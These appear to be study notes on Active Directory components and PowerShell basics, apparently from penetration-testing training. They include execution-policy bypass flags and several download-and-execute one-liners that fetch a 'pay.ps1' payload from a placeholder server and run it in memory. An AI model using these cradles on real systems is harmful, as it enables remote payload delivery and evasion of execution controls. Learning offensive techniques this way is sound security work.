# AD Basics & PowerShell Basics

## AD Basics

* Components of AD
  * Shema - Defines objects and their attributes
  * Query and index mechanisem
  * Global catalog - Information about every object
  * Replication service - Distributes information accross domain controllers
* A forest - which is a security boundary - may contain multiple domains and each domain may contain multiple Ous

### How to interact with Active Directory

* \[ADSI]
* .NET Classes (System.DirectoryServices.ActiveDirectoryy)
* Native Executables (like net….)
* PowerShell (.NET classes and WMI)

## Powershell Basics

With PowerShell Scripts you can use cmdlets, native commands, functions, .net, dlls, Windows API

### Help Command

Get-Help \* - Lists everything abtout the help topic

Get-Help process (lists everything which contains the word process)

Update-Help - Update the healp system (v3+)

Get-help cmdlet\_name -Full - List full help about a topic

Get-Help cmdlet\_name -Examples

Get-command -CommandType cmdlet - List all cmdlets

&#x20;

### Execution Policy

It is NOT a security boundary

Powershell -exectionpolicy bypass\
powershell -ep bypass\
Powershell -c \<cmd>\
Powersehll -encodedcommand $env:PSExecutionPolicyPreference="bypass"

&#x20;

### Execute .PS1 File

. .\PowerView.ps1

### Module

Import a module/file\
Import-Module \<modulepath>

List all comamnds of a module:\
Get-Command -Module \<modulename>

&#x20;

### Download and execute PowerShell Scripts

iex (New-Object Net.WebClient).DownloadString('https://webserver/pay.ps1') - Invoke Expression (iex alias)

&#x20;**Use a COM Object**

$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('https://webserver/pay.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response

**PSv3 or newer**

Iex (iwr '[http://websever/ps.ps1](http://websever/ps.ps1)') -iwr is alias for invoke-web request

&#x20;$h=New-Object -ComObject\
Msxml2.xmlhttp;$h.open('GET','http://webserver/ps.ps1',$fasle);$h.send();iex $h.responseText

&#x20;$wr = \[System.NET.WebRequest]::Create("http://werbser.ps.ps1")\
$r = $wr.GetResponse()\
IEX (\[System.IO.StreamReader]\($r.GetResponseStream())).ReadToEnd()

&#x20;







